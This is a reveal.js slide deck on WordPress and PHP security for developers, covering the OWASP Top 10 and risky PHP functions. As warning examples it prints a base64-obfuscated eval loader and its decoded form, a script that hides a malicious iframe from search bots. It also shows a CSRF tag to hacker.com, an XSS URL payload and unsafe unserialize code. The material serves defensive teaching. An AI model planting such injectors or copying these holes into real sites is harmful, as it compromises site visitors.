@@ -1,0 +1,721 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<title>Securing Your Code — Advanced WordPress Security for Developers - WPCampus 2016</title>
+
+	<meta name="description" content="Securing Your Code — Advanced WordPress Security for Developers">
+	<meta name="author" content="Chris Wiegman">
+
+	<link rel="stylesheet" href="../assets/reveal.css">
+	<link rel="stylesheet" href="../assets/theme/night.css" id="theme">
+
+	<!-- Code syntax highlighting -->
+	<link rel="stylesheet" href="../assets/plugin/highlight/zenburn.css">
+</head>
+
+<body>
+
+	<div class="reveal">
+
+		<!-- Any section element inside of this container is displayed as a slide -->
+		<div class="slides">
+			<section>
+				<h1>Securing Your Code</h1>
+
+				<h3>Advanced WordPress Security for Developers</h3>
+
+				<h4><a href="https://slides.chriswiegman.com/wctpa16"
+						title="The Slides">https://slides.chriswiegman.com/wctpa16</a></h4>
+
+				<p>
+					<small><a href="https://www.chriswiegman.com/">Chris Wiegman</a> /
+						<a href="https://twitter.com/ChrisWiegman">@ChrisWiegman</a></small>
+				</p>
+			</section>
+
+			<section>
+				<h2>About me</h2>
+
+				<div style="width: 50%; padding: 0; margin: 0; float: left;">
+					<ul>
+						<li>Web Developer</li>
+						<li>Past
+							<ul>
+								<li>Senior Web Engineer - 10up</li>
+								<li>Developer - iThemes</li>
+								<li>Southern Illinois University</li>
+								<li>St. Edward's University</li>
+							</ul>
+						</li>
+						<li>Teacher</li>
+						<li>Educator</li>
+					</ul>
+				</div>
+				<div style="width: 50%; padding: 0; margin: 0; float: right;">
+					<img src="img/about.jpg" width="328" height="400" alt="About Chris Wiegman" style="border: none">
+				</div>
+			</section>
+
+			<section>
+				<h2>Why do vulnerabilities happen?</h2>
+			</section>
+
+			<section>
+				<h3>PHP's Philosophy</h3>
+				<ul>
+					<li>Not “Secure By Design”</li>
+					<li>PHP designed to have interpreter do as
+						much as possible before the script was run
+						Lowers barrier of entry (easier on
+						developer)
+					</li>
+					<li>Retrieve information (XML, SSL, etc)</li>
+					<li>Populate namespace
+						<ul>
+							<li>$_REQUEST, $_GET, $_POST, etc</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>OWASP Top 10</h2>
+			</section>
+
+			<section>
+				<h3>About the OWASP Top 10</h3>
+				<ul>
+					<li>The Open Web Application Security Project</li>
+					<li>Updated every 3 years (last in 2013)</li>
+					<li>Top 10 web application security risks</li>
+					<li>https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Injection</h3>
+				<ul>
+					<li>“Tricking an application into including unintended commands in the data sent to the
+						interpreter.”
+					</li>
+					<li>Typically SQL or JavaScript Injection</li>
+					<li>Interpreter is anything that can interpret data as a command: PHP, JavaScript, SQL, Shell, etc
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Broken Auth & Session Management</h3>
+				<ul>
+					<li>Session ID used to maintain state
+						<ul>
+							<li>Just as good as credentials</li>
+							<li>Typically exposed in browser/logs/etc</li>
+						</ul>
+					</li>
+					<li>Can compromise user accounts</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Cross Site Scripting (XSS)</h3>
+				<ul>
+					<li>Raw data from attacker sent to your user’s browser</li>
+					<li>Data can be stored in database or files</li>
+					<li>Can steal session, cookies, sensitive data</li>
+					<li>Can redirect to malicious site</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Insecure Direct Object References</h3>
+				<ul>
+					<li>Part of enforcing proper authorization</li>
+					<li>Common mistakes:
+						<ul>
+							<li>Exposing object reference for user, application doesn’t check validity</li>
+						</ul>
+					</li>
+					<li>Risk: users can access unauthorized files or data</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Security Misconfiguration</h3>
+				<ul>
+					<li>A misconfiguration on the layer underlying the application</li>
+					<li>Impact
+						<ul>
+							<li>All ranges of impact depending on the problem</li>
+						</ul>
+					</li>
+					<li>Example:
+						<ul>
+							<li><code><pre>
+location ~ \.php$ {
+	include /etc/nginx/fastcgi_params;
+	fastcgi_pass 127.0.0.1:9000;
+	fastcgi_index index.php;
+	fastcgi_param SCRIPT_FILENAME /var/www/public_html$fastcgi_script_name;
+}
+						</pre>
+						</code></li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Sensitive Data Exposure</h3>
+				<ul>
+					<li>The exposure of user credentials or other personal data</li>
+					<li>Membership sites and email addresses particularly vulnerable in WordPress</li>
+					<li>Many sites do not adequately protect user data including credentials and other data.</li>
+					<li>Risk – quite high although often difficult to detect.</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Missing Function Level Access Control</h3>
+				<ul>
+					<li>Protecting critical functions by “hiding” them</li>
+					<li>Most access control is applied in the UI, not in the server</li>
+					<li>Risk – High and easy to exploit</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Cross Site Request Forgery</h3>
+				<ul>
+					<li>When the victim’s browser is tricked into issuing commands to a vulnerable app</li>
+					<li>Caused by browsers automatically including user auth data
+						<ul>
+							<li>Session cooke, Basic Auth, IP address, client-side SSL, Windows domain, auth</li>
+						</ul>
+					</li>
+					<li>Impact: steal data, initiate transactions</li>
+					<li>Example:
+						<ul>
+							<li>
+								<pre><code data-trim data-noescape>
+							&lt;img src="http://hacker.com/vote/30"&gt;
+						</code></pre>
+							</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Using Components with Known Vulnerabilities</h3>
+				<ul>
+					<li>Using components with known problems</li>
+					<li>Common in WordPress with external plugins, themes, code, etc</li>
+					<li>Risk – Depends on the situation but quite common</li>
+					<li>Example – Heartbleed, old versions of any software</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Unvalidated Redirects and Forwards</h3>
+				<ul>
+					<li>Unchecked redirects can send users to phishing or malware sites</li>
+					<li>In WordPress can result from redirects during form submission</li>
+					<li>Often the result of redirecting to a user-supplied location</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Classic PHP Vulnerabilities</h2>
+			</section>
+
+			<section>
+				<h3>Register_Globals</h3>
+				<ul>
+					<li>Allowed super global variable to be accessed
+						<ul>
+							<li>$_GET[‘authenticated’] as $authenticated</li>
+						</ul>
+					</li>
+					<li>Example
+						<ul>
+							<li>
+								<pre><code data-trim data-noescape>
+if (authenticated_user()) {
+	$authorized = true;
+}
+if ($authorized) {
+	include "/highly/sensitive/data.php”;
+}
+					</code></pre>
+							</li>
+						</ul>
+					</li>
+					<li>Attacker goes to /my_script.php?authorized=1
+						<ul>
+							<li>What happens?</li>
+						</ul>
+					</li>
+					<li>Remedies
+						<ul>
+							<li>Make sure it is turned off and always provide default values for variables</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Magic Quotes</h3>
+				<ul>
+					<li>Magic quotes attempt to automatically esc input data (POST/GET/etc)</li>
+					<li>Problems:
+						<ul>
+							<li>Performance – not everything needs to be sanitized</li>
+							<li>Portability – what if the new server doesn’t have it?</li>
+							<li>Security – what if the production/new/etc server doesn’t have it?</li>
+						</ul>
+					</li>
+					<li>Lazy code!!</li>
+					<li>Remedies
+						<ul>
+							<li>Always use proper data sanitization – filter_var, sanitize_text_field, etc</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Are These Still Relevant?</h3>
+				<ul>
+					<li>Deprecated in PHP 5.3</li>
+					<li>Removed in PHP 5.4</li>
+					<li>But...
+						<ul>
+							<li>WordPress still supports PHP 5.2 (along with many hosts)</li>
+							<li>Those who learned with magic quotes are at a disadvantage</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Some PHP Functions to Avoid</h2>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape>
+&lt;?php
+eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOw0KJGJvdCA9IEZ
+				BTFNFIDsNCiR1c2VyX2FnZW50X3RvX2ZpbHRlciA9IG
+				FycmF5KCdib3QnLCdzcGlkZXInLCdzcHlkZXInLCdjc
+				mF3bCcsJ3ZhbGlkYXRvcicsJ3NsdXJwJywnZG9jb21v
+				JywneWFuZGV4JywnbWFpbC5ydScsJ2FsZXhhLmNvbSc
+				sJ3Bvc3RyYW5rLmNvbScsJ2h0bWxkb2MnLCd3ZWJjb2
+				xsYWdlJywnYmxvZ3B1bHNlLmNvbScsJ2Fub255bW91c
+				2Uub3JnJywnMTIzNDUnLCdodHRwY2xpZW50JywnYnV6
+				enRyYWNrZXIuY29tJywnc25vb3B5JywnZmVlZHRvb2x
+				zJywnYXJpYW5uYS5saWJlcm8uaXQnLCdpbnRlcm5ldH
+				NlZXIuY29tJywnb3BlbmFjb29uLmRlJywncnJycnJyc
+				nJyJywnbWFnZW50JywnZG93bmxvYWQgbWFzdGVyJywn
+				ZHJ1cGFsLm9yZycsJ3ZsYyBtZWRpYSBwbGF5ZXInLCd
+				2dnJraW1zanV3bHkgbDN1Zm1qcngnLCdzem4taW1hZ2
+				UtcmVzaXplcicsJ2JkYnJhbmRwcm90ZWN0LmNvbScsJ
+				3dvcmRwcmVzcycsJ3Jzc3JlYWRlcicsJ215YmxvZ2xv
+				ZyBhcGknKTsNCiRzdG9wX2lwc19tYXNrcyA9IGFycmF
+				5KA0KCWFycmF5KCIyMTYuMjM5LjMyLjAiLCIyMTYuMj
+				M5LjYzLjI1NSIpLA0KCWFycmF5KCI2NC42OC44MC4wI
+				iAgLCI2NC42OC44Ny4yNTUiICApLA0KCWFyc...'));
+				</code></pre>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape>
+ &lt;?php
+error_reporting(0);
+$bot = FALSE ;
+$user_agent_to_filter =
+array('bot','spider','spyder','crawl','validator','slurp','docomo','yandex','mail.ru','alexa.com','postrank.com','htmldoc','webcollage','blogpulse.com','anonymouse.org','12345','httpclient','buzztracker.com','snoopy','feedtools','arianna.libero.it','internetseer.com','openacoon.de','rrrrrrrrr','magent','download master','drupal.org','vlc media player','vvrkimsjuwly l3ufmjrx','szn-image-resizer','bdbrandprotect.com','wordpress','rssreader','mybloglog api');
+$stop_ips_masks = array(
+    array("216.239.32.0","216.239.63.255"),
+    array("64.68.80.0"  ,"64.68.87.255"  ),
+    array("66.102.0.0",  "66.102.15.255"),
+    array("64.233.160.0","64.233.191.255"),
+    array("66.249.64.0", "66.249.95.255"),
+    array("72.14.192.0", "72.14.255.255"),
+    array("209.85.128.0","209.85.255.255"),
+    array("198.108.100.192","198.108.100.207"),
+    array("173.194.0.0","173.194.255.255"),
+    array("216.33.229.144","216.33.229.151"),
+    array("216.33.229.160","216.33.229.167"),
+    array("209.185.108.128","209.185.108.255"),
+    array("216.109.75.80","216.109.75.95"),
+    array("64.68.88.0","64.68.95.255"),
+    array("64.68.64.64","64.68.64.127"),
+    array("64.41.221.192","64.41.221.207"),
+    array("74.125.0.0","74.125.255.255"),
+    array("65.52.0.0","65.55.255.255"),
+    array("74.6.0.0","74.6.255.255"),
+    array("67.195.0.0","67.195.255.255"),
+    array("72.30.0.0","72.30.255.255"),
+    array("38.0.0.0","38.255.255.255")
+    );
+$my_ip2long = sprintf("%u",ip2long($_SERVER['REMOTE_ADDR']));
+foreach ( $stop_ips_masks as $IPs ) {
+	$first_d=sprintf("%u",ip2long($IPs[0])); $second_d=sprintf("%u",ip2long($IPs[1]));
+	if ($my_ip2long >= $first_d && $my_ip2long <= $second_d) {$bot = TRUE; break;}
+}
+foreach ($user_agent_to_filter as $bot_sign){
+	if  (strpos($_SERVER['HTTP_USER_AGENT'], $bot_sign) !== false){$bot = true; break;}
+}
+if (!$bot) {
+	echo '&lt;div style="position: absolute; left: -1999px; top: -2999px;"&gt;&lt;iframe src="http://lzqqarkl.co.cc/QQkFBwQGDQMGBwYAEkcJBQcEAAcDAAMBBw==" width="2" height="2"&gt;&lt;/iframe&gt;&lt;/div&gt;';
+}
+			</code></pre>
+			</section>
+
+			<section>
+				<h3>Base64_encode()/Base64_decode()</h3>
+				<ul>
+					<li>Why would you use it?
+						<ul>
+							<li>Transfer binary data over a network</li>
+						</ul>
+					</li>
+					<li>Why is it bad?
+						<ul>
+							<li>By itself it often isn’t (encode images, etc)</li>
+							<li>Often used by attackers to obfuscate malicious script (so you don’t know what its doing)
+							</li>
+							<li>Banned by some hosts</li>
+							<li>Flagged by some scanners</li>
+							<li>Often not validated</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Use JSON for text data</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>eval()</h3>
+				<ul>
+					<li>Why would you use it?
+						<ul>
+							<li>To execute remove code</li>
+						</ul>
+					</li>
+					<li>Why is it evil?
+						<ul>
+							<li>To execute remote code</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Use an established API or similar service</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape> preg_replace( '/.*/e', $_POST['code'] );</code></pre>
+			</section>
+
+			<section>
+				<h3>Preg_replace()</h3>
+				<ul>
+					<li>Why would you use it?
+						<ul>
+							<li>To replace text in a given string</li>
+						</ul>
+					</li>
+					<li>What is the problem?
+						<ul>
+							<li>/e modifier = PREG_REPLACE_EVAL
+								<ul>
+									<li>Code is evaluated as PHP</li>
+								</ul>
+							</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Notes – Deprecated in PHP 5.5</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape>create_function( ‘$y', $some_string );</code></pre>
+			</section>
+
+			<section>
+				<h3>Create_function()</h3>
+				<ul>
+					<li>Why use it?
+						<ul>
+							<li>Before anonymous functions it allowed for psuedo anonymous functions (think JavaScript)
+							</li>
+							<li>Call a function as a variable</li>
+						</ul>
+					</li>
+					<li>What is the problem?
+						<ul>
+							<li>/e modifier = PREG_REPLACE_EVAL
+								<ul>
+									<li>It uses eval – same weaknesses as the eval function</li>
+								</ul>
+							</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>In PHP >=5.3 use a true anonymous function</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape>include( $some_file . ‘.php’ );</code></pre>
+			</section>
+
+			<section>
+				<h3>include/require()</h3>
+				<ul>
+					<li>Why use it?
+						<ul>
+							<li>Link to other PHP files</li>
+						</ul>
+					</li>
+					<li>Why is it evil?
+						<ul>
+							<li>Dynamically generated filenames can lead to remote execution</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Hard-code or validate filename before inclusion</li>
+						</ul>
+					</li>
+					<li>Also applies to require_once() and include_once()</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape>file_get_contents( ‘https://mysecuresite.com/auth.php’ );</code></pre>
+			</section>
+
+			<section>
+				<h3>file_get_contents()</h3>
+				<ul>
+					<li>Why use it?
+						<ul>
+							<li>Read from a given file locally or remote</li>
+							<li>Wraps read in fopen/fclose</li>
+						</ul>
+					</li>
+					<li>Why is it evil?
+						<ul>
+							<li>Subject to man in the middle (MITM) attack
+								<ul>
+									<li>Does not verify SSL certificate</li>
+								</ul>
+							</li>
+							<li>Only when reading remote/https files</li>
+							<li>Applies to all PHP streams/sockets (not just this function)</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Use WordPress APIs</li>
+							<li>Use cURL (no –with-curlwrappers)</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape>
+curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
+curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, FALSE );
+			</code></pre>
+			</section>
+
+			<section>
+				<h3>cURL Options</h3>
+				<ul>
+					<li>CURLOPT_SSL_VERIFYHOST
+						<ul>
+							<li>checks that the cert was issued to the entity you wanted to talk to.</li>
+						</ul>
+					</li>
+					<li>CURLOPT_SSL_VERIFYPEER
+						<ul>
+							<li>checks that the remote certificate is valid, i.e. that you trust that it was issued by a
+								CA
+								you trust and that it's genuine
+							</li>
+						</ul>
+					</li>
+					<li>Why change them (turn them off)?
+						<ul>
+							<li>Self-signed cert on dev server</li>
+							<li>Other forced connection</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Fix SSL issues on server you’re connecting to</li>
+							<li>Use letsencrypt.org for dev</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape> filter_var( ‘javascript://supergoodstuff%0Aalert(1)‘, FILTER_VALIDATE_URL );</code></pre>
+			</section>
+
+			<section>
+				<h3>file_get_contents()</h3>
+				<ul>
+					<li>Why use it?
+						<ul>
+							<li>To validate input</li>
+						</ul>
+					</li>
+					<li>Why is it bad?
+						<ul>
+							<li>Not all uses are bad</li>
+							<li>Watch out for FILTER_VALIDATE_URL
+								<ul>
+									<li>accepts any alphabetic string followed by ://
+										<ul>
+											<li>http://somesite.com validates</li>
+											<li>So does javascript://somecomment%0Aalert(1)
+												<ul>
+													<li>Same as javascript:alert(1)</li>
+													<li>//comment seen as comment, %0A is new line</li>
+												</ul>
+											</li>
+										</ul>
+									</li>
+								</ul>
+							</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Use WordPress APIs</li>
+							<li>Validate protocol yourself or use a different validator</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code data-trim data-noescape>
+&lt;?php
+if ( ! isset( $HTTP_RAW_POST_DATA ) ) {
+	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
+}
+
+ob_start();
+
+$data = base64_decode( $HTTP_RAW_POST_DATA );
+
+if ( $data ) {
+	$unserialized_data = @unserialize( $data );
+}
+
+			</code></pre>
+			</section>
+
+			<section>
+				<h3>unserialize()</h3>
+				<ul>
+					<li>Why use it?
+						<ul>
+							<li>Decode serialized data</li>
+							<li>Data transport mechanisms such as XMLRPC and others</li>
+						</ul>
+					</li>
+					<li>Why is it evil?
+						<ul>
+							<li>Unserialization can result in code being loaded and executed due to object instantiation
+								and
+								autoloading
+							</li>
+						</ul>
+					</li>
+					<li>Alternatives
+						<ul>
+							<li>Use JSON</li>
+						</ul>
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Resources</h3>
+				<ul>
+					<li>
+						<a
+							href="https://github.com/squizlabs/PHP_CodeSniffer">https://github.com/squizlabs/PHP_CodeSniffer</a>
+						<ul>
+							<li><a
+									href="https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards">https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards</a>
+							</li>
+						</ul>
+					</li>
+					<li><a href="https://blog.sucuri.net">https://blog.sucuri.net</a></li>
+					<li><a href="https://wpscan.org">https://wpscan.org</a></li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Questions?</h2>
+			</section>
+
+			<section>
+				<h2>Thank You</h2>
+
+				<h3><a href="https://slides.chriswiegman.com/wctpa16"
+						title="The Slides">https://slides.chriswiegman.com/wctpa16</a></h3>
+
+				<p>
+					<small><a href="https://www.chriswiegman.com/">Chris Wiegman</a> /
+						<a href="https://twitter.com/ChrisWiegman">@ChrisWiegman</a></small>
+				</p>
+			</section>
+
+		</div>
+
+	</div>
+
+	<script src="../assets/reveal.js"></script>
+	<script src="../assets/plugin/highlight/highlight.js"></script>
+
+	<script>
+		Reveal.initialize({
+			controls: true,
+			progress: true,
+			history: true,
+			center: true,
+			hideAddressBar: true,
+			plugins: [RevealHighlight],
+			transition: 'convex'
+		});
+	</script>
+</body>
+
+</html>
